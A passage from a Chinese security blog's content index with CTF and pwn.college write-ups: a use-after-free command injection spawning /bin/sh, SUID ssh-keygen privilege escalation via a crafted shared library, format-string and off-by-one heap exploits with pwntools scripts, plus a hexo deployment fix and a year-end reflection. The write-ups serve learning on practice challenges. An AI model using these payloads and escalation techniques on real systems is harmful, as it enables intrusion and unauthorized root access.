[rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">free</span>(value);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Are you sure you want to exit (y/N)? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);<span class="number">99</span></span><br><span class="line">  <span class="keyword">if</span> ( (s[<span class="number">0</span>] &amp; <span class="number">0xDF</span>) == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK, exiting.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了这两个漏洞,我们想一想如何利用</p><p>最为直观的想法,就是命令注入执行<code>system(/bin/sh);</code>我们可以注意到<code>__snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#39;%s&#39;&quot;, bss, ptr);</code>参数ptr可以将用户的输入写入command,但是输入参数ptr中的内容会被check_format()函数检查,只有输入的字符全部符合才能通过,直接写是肯定行不通的,这时uaf就派上用场了</p><p>首先,我们先进菜单1,执行<code>strdup(str);</code>分配堆空间后,ptr指向这段堆空间(保证分配的空间free后能进fastbin或tcache)</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403072136668.png" alt="search"></p><p>进菜单5,free(ptr),ptr指向的这段内存空间会放在fastbin(glibc &gt;&#x3D; 2.27,则会放入tcache),ptr成为悬空指针</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403072136665.png" alt="bins"></p><p>进菜单3,执行<code>strdup(str);</code>尽量保证分配字节数与第一步分配的一致,这样使得malloc的内存是刚刚放入fastbin的内存,现在value和ptr两个指针指向同一块内存,这样修改value指向的内存实际上也是修改ptr指向的内存,这就绕过了只能输入特定字符的限制</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403072136666.png" alt="heap"></p><p>当然此程序没有提供edit功能,所以我们在进菜单3时就将payload构造好,<code>&quot;/bin/date -d @%d +&#39;%s&#39;&quot;</code>在原先的command字符串上,我们可以动手脚的地方就是<code>%s</code>,显然,直接填&#x2F;bin&#x2F;sh是<code>&#39;/bin/sh&#39;</code>行不通。我们可以用<code>&#39;&#39;</code>闭合,<code>;</code>分隔command命令,使其可以执行<code>;</code>前和<code>;</code>后的命令,同时pwntools中sendline(b’’’’)语法是错的,所以需要<code>\</code>转义,最后payload应为<code>sendline(b&#39;\&#39;;/bin/sh\&#39;&#39;)</code></p><p>x32:fastbin中chunk范围<strong>0x10-0x40</strong>,最小的chunk为<strong>0x10</strong></p><p>x64:fastbin中chunk范围<strong>0x20-0x80</strong>,tcache中chunk范围<strong>0x20到0x410</strong>,一般情况下最小的chunk为<strong>0x20</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./time&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;61.147.171.105&#x27;,51218)</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_format</span>(<span class="params"><span class="built_in">format</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Format:&#x27;</span>,<span class="built_in">format</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Are you sure you want to exit (y/N)? &#x27;</span>,<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_zone</span>(<span class="params">payload</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Time zone: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">set_format(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">exit()</span><br><span class="line">set_zone(<span class="string">b&#x27;\&#x27;;/bin/sh\&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">CTF Wiki</a></p><p><a href="https://www.cnblogs.com/oldoldcoder/p/15435057.html#scroller-4">time_formatter攻防世界学习</a></p>]]></content>
      
      
      <categories>
          
          <category> 攻防世界 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh-keygen提权</title>
      <link href="/posts/1ca7db7c/"/>
      <url>/posts/1ca7db7c/</url>
      
        <content type="html"><![CDATA[<p>pwn.college的level51卡了好久，写文章记录一下做题过程</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p><p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>运行challenge目录下的babysuid_level51，题目告诉我们ssh-keygen设置了suid位，并给了要加载自己的代码的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This challenge is part of a series of programs that</span><br><span class="line">show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).</span><br><span class="line"></span><br><span class="line">I just set the SUID bit on /usr/bin/ssh-keygen.</span><br><span class="line">Try to use it to read the flag!</span><br></pre></td></tr></table></figure><p><code>ssh-keygen -D ./</code>可以加载动态链接库文件，所以我们就编写一个动态链接库看看</p><p><code>ls -l</code>or<code>ll</code>查看目录权限，发现hacker用户(用户)在<code>home/hacker</code>目录下有rwx权限</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202402280056786.png" alt="目录权限"></p><p><code>cd home/hacker</code>进入hacker目录，<code>touch test.c</code>创建c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc test.c -shared -o test.so </code>编译动态链接库</p><h1 id="易出错点"><a href="#易出错点" class="headerlink" title="易出错点"></a>易出错点</h1><p><code>ssh-keygen -D ./test.so</code>加载动态链接库，然后会出现如下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.so does not contain expected string C_GetFunctionList</span><br><span class="line">provider test.so is not a PKCS11 library</span><br><span class="line">cannot read public key from pkcs11</span><br></pre></td></tr></table></figure><p>报错提示我们test.so不包含字符串C_GetFunctionList(test.so does not contain expected string C_GetFunctionList)，只需让我们的test.c包含字符串C_GetFunctionList即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新执行上述命令，成功让ssh-keygen执行了代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">C_GetFunctionList for provider ./test.so failed: 12</span><br><span class="line">cannot read public key from pkcs11</span><br></pre></td></tr></table></figure><p>修改代码使其读取flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">C_GetFunctionList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(fd,buf,<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwn.college&#123;xxxxxx&#125;</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><p><a href="https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4+2=8G8Y=P5QwD&alichlgref=https://www.google.com/#toc-13">浅谈linux suid提权</a></p></li><li><p><a href="https://pwn.college/fundamentals/program-misuse">Program Misuse</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn.college </category>
          
      </categories>
      
      
        <tags>
            
            <tag> suid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>error spawn failed报错</title>
      <link href="/posts/159ace20/"/>
      <url>/posts/159ace20/</url>
      
        <content type="html"><![CDATA[<p>整理了一下博客,发现<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d </code>报错<code>error spawn failed...</code>,记录下解决方法</p><h2 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h2><ol><li>如果<code>.deploy_git</code>里的文件被修改可能出现此问题,参考方法一</li><li><code>ssh -vT git@github.com</code>测试是否能连通,若出现<code>ssh: connect to host xx.xx.xx.xx port 22: Connection timed out</code>,22端口可能被防火墙或运营商屏蔽,参考方法二</li></ol><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><ol><li>删除<code>.deploy_git</code></li><li><code>git config --global core.autocrlf false</code></li><li><code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></li></ol><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>在<code>C:\Users\USERNAME\.ssh</code>中找到config文件,没有的话新建一个,<code>USERNAME</code>为电脑用户名,在config文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  Hostname ssh.github.com</span><br><span class="line">  Port 443</span><br></pre></td></tr></table></figure><p>执行<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写在2023结束</title>
      <link href="/posts/93aed580/"/>
      <url>/posts/93aed580/</url>
      
        <content type="html"><![CDATA[<p>还有一天2023年就要结束了，一年回顾下来，还真是发生了不少事。想想之前的经历，记忆已经模糊了不少，趁现在还有少许残存，记录下来，权当留念。</p><p>入坑安全大概是在三月份，回想起来，当初并没有什么特别的想法(<del>或者说想法早就被我忘掉了</del>)，就是觉得很有趣，于是就搜集些资料学习。学着学着发现一个人搞太无聊了，学习路线也是没有，这时候实验室正好招新，机缘巧合之下就进入到实验室。在实验室学习打比赛，成长的很快(<del>也许并不快</del>)，同时也很累。上半年办完国赛，考试完就放假了。假期里拿了个驾照，其他没干什么。下半年不是疫情又是流感，天天发烧，身体恢复的很慢，学习进度也慢了不少。接下来的计划，搞完house of系列后，学一下iot和browser，希望2024能在二进制安全做出一点成绩。</p>]]></content>
      
      
      <categories>
          
          <category> 年终总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 强网杯小记</title>
      <link href="/posts/11686/"/>
      <url>/posts/11686/</url>
      
        <content type="html"><![CDATA[<p>昨天5点强网杯结束，坐牢两天，折磨的一批</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h2 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h2><p>泄露libc基址，修改printf函数返回地址为start重新执行，修改main返回地址为one_gadget</p><p><code>ps:printf函数内部执行ret指令前，数据已经修改完成，所以修改printf函数返回地址也是ok的</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ez_fmt&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.104.24.40&#x27;,1337)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is a gift for you &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x68</span></span><br><span class="line">stack1=stack-<span class="number">0x70</span></span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">read=<span class="number">0x40121B</span></span><br><span class="line">printf=<span class="number">0x4011ED</span></span><br><span class="line">start=<span class="number">0x4010B0</span></span><br><span class="line">exe=<span class="number">0xe3afe</span></span><br><span class="line">fake=exe+<span class="number">0x7fa8eb328000</span></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x401239&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%19$p&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((start&amp;<span class="number">0xffff</span>)-<span class="number">0xe</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack1)</span><br><span class="line">p.send(payload)</span><br><span class="line">libcbase=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase =&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">exe=<span class="number">0xe3b01</span>+libcbase</span><br><span class="line">log.success(<span class="string">&#x27;exe =&gt;&#x27;</span>+<span class="built_in">hex</span>(exe))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;There is a gift for you &#x27;</span>)</span><br><span class="line">stack2=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x68</span></span><br><span class="line">log.success(<span class="string">&#x27;stack2 =&gt;&#x27;</span>+<span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(((exe&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((exe&amp;<span class="number">0xffff</span>)-((exe&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">32</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stack2+<span class="number">2</span>)+p64(stack2)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="trie"><a href="#trie" class="headerlink" title="trie"></a>trie</h2><p>逻辑漏洞，思路是通过<code>add</code>添加destination IP使next hop写到secret上，调用<code>get_flag</code>把flag覆盖到secret，<code>view</code>把flag打出来</p><p>难点在于确定destination IP的值</p><p>贴个半成品wp(未完待续…)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(b&#x27;47.104.150.173&#x27;,1337)</span></span><br><span class="line">p=process(<span class="string">&#x27;./trie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *$rebase(0x157E)&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ip,hop</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;4. Quit.\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input destination IP:\n&#x27;</span>,ip)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input the next hop:&#x27;</span>,hop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">ip</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;4. Quit.\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Input destination IP:\n&#x27;</span>,ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;4. Quit.\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;1.1.1.1&#x27;</span>,<span class="string">b&#x27;2.2.2.2&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;0.0.0.0&#x27;</span>,<span class="string">b&#x27;255.255.255.255&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="string">b&#x27;128.0.0.0&#x27;</span>,<span class="string">b&#x27;255.255.255.255&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="string">b&#x27;192.0.0.0&#x27;</span>,<span class="string">b&#x27;255.255.255.255&#x27;</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">flag()</span><br><span class="line">view(<span class="string">b&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line">view(<span class="string">b&#x27;128.0.0.0&#x27;</span>)</span><br><span class="line">view(<span class="string">b&#x27;192.0.0.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off-by-one</title>
      <link href="/posts/40587/"/>
      <url>/posts/40587/</url>
      
        <content type="html"><![CDATA[<h1 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h1><p>题目地址:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>关闭ASLR保护</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h3 id="brk与mmap"><a href="#brk与mmap" class="headerlink" title="brk与mmap"></a>brk与mmap</h3><p>堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。<br>我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之前存在固定的偏移因此可以推算出 libc 的基地址。</p><h3 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h3><p>在2.34及以上的版本中删除了malloc_hook、freehook等钩子函数，虽然在libc中我们仍然能够查询到标签，但是实际上已经不参与调用了，这就导致之前的对于堆的许多攻击手法都基本失效了。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>逆向出关键结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v2[<span class="number">6</span>] = <span class="number">0</span>;                        <span class="comment">// size</span></span><br><span class="line">*(description + v1) = v2;         <span class="comment">// struct pointer</span></span><br><span class="line">*(v2 + <span class="number">2</span>) = v4;                   <span class="comment">// description pointer</span></span><br><span class="line">*(v2 + <span class="number">1</span>) = ptr;                  <span class="comment">// name pointer</span></span><br><span class="line">*v2 = ++id;                       <span class="comment">// id</span></span><br></pre></td></tr></table></figure><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>循环设置错误,最后多输入一个字节,存在off-by-null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, name, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *name == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ++name;</span><br><span class="line">  <span class="keyword">if</span> ( i == size )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">*name = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>off-by-null覆盖<code>struct1</code>的指针最后一字节为<code>\x00</code>,提前在该地址布置<code>fake_struct</code>,并伪造<code>fake_struct</code>的<code>name pointer</code>和<code>description pointer</code>为<code>struct2</code>中<code>name pointer</code>和<code>description pointer</code>的地址,计算libcbase偏移,劫持<code>struct2</code>中<code>description pointer</code>为<code>free_hook</code>,one_gadget拿shell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span 